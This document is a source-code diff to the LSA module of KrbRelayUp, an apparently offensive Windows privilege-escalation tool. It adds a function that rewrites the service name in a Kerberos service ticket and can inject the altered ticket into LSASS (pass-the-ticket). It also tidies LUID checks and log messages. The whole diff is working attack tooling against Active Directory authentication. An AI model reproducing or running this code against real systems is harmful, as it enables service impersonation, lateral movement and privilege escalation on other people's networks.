@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.ComponentModel;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
@@ -8,6 +9,40 @@ namespace KrbRelayUp
 {
     public class LSA
     {
+
+        public static byte[] SubstituteTGSSname(KRB_CRED kirbi, string altsname, bool ptt = false, LUID luid = new LUID())
+        {
+            // subtitutes in an alternate servicename (sname) into a supplied service ticket
+
+            Console.WriteLine("[+] Substituting in alternate service name: {0}", altsname);
+
+            var name_string = new List<string>();
+            var parts = altsname.Split('/');
+            if (parts.Length == 1)
+            {
+                // sname alone
+                kirbi.tickets[0].sname.name_string[0] = parts[0]; // ticket itself
+                kirbi.enc_part.ticket_info[0].sname.name_string[0] = parts[0]; // enc_part of the .kirbi
+            }
+            else if (parts.Length == 2)
+            {
+                name_string.Add(parts[0]);
+                name_string.Add(parts[1]);
+
+                kirbi.tickets[0].sname.name_string = name_string; // ticket itself
+                kirbi.enc_part.ticket_info[0].sname.name_string = name_string; // enc_part of the .kirbi
+            }
+
+            var kirbiBytes = kirbi.Encode().Encode();
+
+            if (ptt || ((ulong)luid != 0))
+            {
+                // pass-the-ticket -> import into LSASS
+                LSA.ImportTicket(kirbiBytes, luid);
+            }
+            return kirbiBytes;
+        }
+
         #region LSA interaction
 
         public static IntPtr LsaRegisterLogonProcessHelper()
@@ -92,7 +127,7 @@ namespace KrbRelayUp
             int AuthenticationPackage;
             int ntstatus, ProtocalStatus;
 
-            if ((ulong)targetLuid != 0)
+            if (targetLuid != 0)
             {
                 if (!Helpers.IsHighIntegrity())
                 {
@@ -146,9 +181,9 @@ namespace KrbRelayUp
                 request.KerbCredSize = ticket.Length;
                 request.KerbCredOffset = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST));
 
-                if ((ulong)targetLuid != 0)
+                if (targetLuid != 0)
                 {
-                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
+                    Console.WriteLine("[+] Target LUID: 0x{0:x}", (ulong)targetLuid);
                     request.LogonId = targetLuid;
                 }
 
@@ -168,7 +203,7 @@ namespace KrbRelayUp
                 {
                     var winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                     var errorMessage = new Win32Exception((int)winError).Message;
-                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocalStatus): {1}", winError, errorMessage);
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocolStatus): {1}", winError, errorMessage);
                     return;
                 }
                 Console.WriteLine("[+] Ticket successfully imported!");
@@ -193,7 +228,7 @@ namespace KrbRelayUp
             int AuthenticationPackage;
             int ntstatus, ProtocalStatus;
 
-            if ((ulong)targetLuid != 0)
+            if (targetLuid != 0)
             {
                 if (!Helpers.IsHighIntegrity())
                 {
@@ -225,9 +260,9 @@ namespace KrbRelayUp
                 var request = new Interop.KERB_PURGE_TKT_CACHE_REQUEST();
                 request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage;
 
-                if ((ulong)targetLuid != 0)
+                if (targetLuid != 0)
                 {
-                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
+                    Console.WriteLine("[+] Target LUID: 0x{0:x}", (ulong)targetLuid);
                     request.LogonId = targetLuid;
                 }
 
